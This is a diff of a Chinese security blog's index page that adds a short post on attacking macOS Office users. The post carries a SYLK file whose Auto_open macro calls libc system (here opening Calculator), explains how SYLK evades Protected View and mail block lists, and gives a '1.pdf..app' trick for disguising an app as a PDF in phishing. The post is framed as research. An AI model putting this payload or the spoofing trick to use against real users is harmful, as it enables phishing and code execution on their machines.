@@ -200,6 +200,16 @@
           </a>
         </li>
       
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
 
       
     </ul>
@@ -219,6 +229,150 @@
           <div id="content" class="content">
             
   <section id="posts" class="posts-expand">
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/06/16/Macos-Office攻防/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="YoungRichOG">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="YoungRichOG">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2021/06/16/Macos-Office攻防/" itemprop="url">Macos Office攻防</a></h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-06-16T23:32:29+08:00">
+                2021-06-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="Macos-Office攻防"><a href="#Macos-Office攻防" class="headerlink" title="Macos Office攻防"></a>Macos Office攻防</h1><p><strong><del>转载请注明出处：<a href="https://youngrichog.github.io/" target="_blank" rel="noopener">https://youngrichog.github.io/</a></del></strong></p>
+<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>最近看了看Macos下的攻防视角都有什么，之前的话有做过AppleScript，在mac &lt;10.15还是屡试不爽的，舒服至极。但是针对于&gt;10.15版本，好像自己没有什么积累，索性就开始研究研究，主要涉及到SYLK利用、权限维持、沙箱跳出等。</p>
+<p>什么是SYLK？</p>
+<blockquote>
+<p>SYLK 代表 SYmbolic LinkK，一种于 1980 年代引入的文件格式。通常，SYLK 文件的文件扩展名为 .slk。SYLK 是一种仅使用可显示的 ANSI 字符的文件格式，创建它是为了在应用程序（例如电子表格和数据库）之间交换数据。</p>
+<p>尽管是一种古老的文件格式，但文件扩展名 .slk 在最新的 MS Office 版本（在 2010、2013 、2016和2019）上仍然默认映射到 Excel。</p>
+</blockquote>
+<p>说说SYLK的优点？</p>
+<blockquote>
+<p>SYLK 格式吸引攻击者的一个重要原因是：<a href="https://support.office.com/en-us/article/what-is-protected-view-d6f09ac7-e6b9-4495-8e43-2bbcdbcb6653" target="_blank" rel="noopener">受保护的视图沙箱</a>不适用于这种文件格式。这意味着，如果武器化 SYLK 文件是通过电子邮件或 Web 传送的，并且应用了<a href="https://textslashplain.com/2016/04/04/downloads-and-the-mark-of-the-web/" target="_blank" rel="noopener">Web 标记标记</a>，则目标用户不会被此警告消息打扰。</p>
+<p>此外，扩展名为 .slk 的 SYLK 文件具有以下特征。</p>
+<ul>
+<li>SYLK 不包括在<a href="https://support.office.com/en-us/article/blocked-attachments-in-outlook-434752e1-02d3-4e90-9124-8b81e49a8519" target="_blank" rel="noopener">MS Outlook 阻止的附件列表中</a>。</li>
+<li>SYLK 不包括在<a href="https://www.zdnet.com/article/microsoft-bans-38-file-extensions-in-outlook-for-the-web/" target="_blank" rel="noopener">默认的 OWA 阻止扩展列表中</a>。</li>
+<li>SYLK 在<a href="https://cs.chromium.org/chromium/src/chrome/browser/resources/safe_browsing/download_file_types.asciipb" target="_blank" rel="noopener">Chrome 的安全浏览文件类型列表中</a>未标记为危险。</li>
+</ul>
+</blockquote>
+<p>嗯，的确是一个武器化的理想选择。简单点说SYLK就是一个old school，可以兼容新版Office，并且不在大众的视野里。</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>xxxx.slk</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ID;P</span><br><span class="line">O;E</span><br><span class="line">NN;NAuto_open;ER101C1;KOut Flank;F</span><br><span class="line">C;X1;Y101;K0;ECALL(&quot;libc.dylib&quot;,&quot;system&quot;,&quot;JC&quot;,&quot;open -a Calculator&quot;)</span><br><span class="line">C;X1;Y102;K0;EHALT()</span><br><span class="line">E</span><br></pre></td></tr></table></figure>
+<h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><p><strong>1.利用宏进行钓鱼攻击，高版本office都会运行在沙盒中，所以我们要考虑沙箱跳出</strong></p>
+<p><strong>2.office沙箱环境目录:/Users/Current User/Library/Containers/com.microsoft.Excel/Data/，其中拿Excel举例</strong></p>
+<p><strong>3.office临时文件目录，echo $TMPDIR，每当打开excel文件或其他，都会有对应临时文件</strong></p>
+<p><strong>4.钓鱼姿势，适用于各类Macos钓鱼场景，当时在绕过AppleScript显示app为后缀，在macos10.15后，失效了一部分姿势，例如：Mac在键盘处加入Unicode，然后输入的时候用option+Unicode编号就可以了，例如d为option + 217e 使用Unicode可以绕过文件显示app的情况。重点来了在高版本的macos，可以这样绕过：1.pdf..app 显示1.pdf.</strong></p>
+<h2 id="Respect"><a href="#Respect" class="headerlink" title="Respect"></a>Respect</h2><p><a href="https://outflank.nl/blog/2019/10/30/abusing-the-sylk-file-format/" target="_blank" rel="noopener">https://outflank.nl/blog/2019/10/30/abusing-the-sylk-file-format/</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
     
       
 
@@ -1384,131 +1538,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/08/Active-Directory域-ACL相关安全研究/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="YoungRichOG">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="YoungRichOG">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/02/08/Active-Directory域-ACL相关安全研究/" itemprop="url">Active Directory域-ACL相关安全研究</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-08T12:15:36+08:00">
-                2020-02-08
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h1 id="Active-Directory域-ACL相关安全研究"><a href="#Active-Directory域-ACL相关安全研究" class="headerlink" title="Active Directory域-ACL相关安全研究"></a>Active Directory域-ACL相关安全研究</h1><p><strong><del>转载请注明出处：<a href="https://youngrichog.github.io/" target="_blank" rel="noopener">https://youngrichog.github.io/</a></del></strong></p>
-<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>从攻击者的角度进行ACL相关安全研究，主要从ACL基础、ACL解析、ACL枚举、ACL利用、ACL自动化攻击、ACL防御几个角度，可能会有不准确和不正确的地方。</p>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2020/02/08/Active-Directory域-ACL相关安全研究/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1559,7 +1588,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-count">20</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -1572,7 +1601,7 @@
               
               <div class="site-state-item site-state-tags">
                 
-                  <span class="site-state-item-count">18</span>
+                  <span class="site-state-item-count">19</span>
                   <span class="site-state-item-name">标签</span>
                 
               </div>
